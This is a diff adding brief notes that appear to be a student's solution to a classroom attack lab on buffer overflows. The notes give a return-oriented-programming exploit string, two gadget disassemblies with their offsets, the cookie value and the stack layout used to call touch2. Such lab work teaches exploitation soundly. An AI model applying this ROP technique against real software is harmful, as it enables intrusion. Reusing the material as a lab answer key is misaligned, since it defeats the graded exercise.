@@ -1,0 +1,45 @@
+0x55640088 is rsp after calling getbuf
+
+cookie is in
+0x604504: 0x3661a994
+
+touch2 is in
+0x401880
+
+exploit:
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+45 1a 40 00 00 00 00 00
+94 a9 61 36 00 00 00 00
+57 1a 40 00 00 00 00 00
+80 18 40 00 00 00 00 00
+
+uhh we are gonna do
+popq to %rax first
+then we are gonna do
+movq %rax to %rdi
+
+gadgets are:
+
+
+0000000000401a55 <setval_392>: (movq)
+  401a55:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
+  401a5b:	c3                   	retq   
+
+0000000000401a41 <addval_451>: (popq)
+  401a41:	8d 87 e5 72 58 90    	lea    -0x6fa78d1b(%rdi),%eax
+  401a47:	c3                   	retq   
+
+so stack should have:
+high address
+
+00 00 00 00 00 40 18 80 // touch2 address
+00 00 00 00 00 40 1a 57 // movq rax rdi gadget address (0x401a55 + 0x2 = 0x401a57)
+00 00 00 00 36 61 a9 94 // rax value (cookie)
+00 00 00 00 00 40 1a 45 // popq to rax gadget address (0x401a41 + 0x4 = 0x401a45)
+
+low address
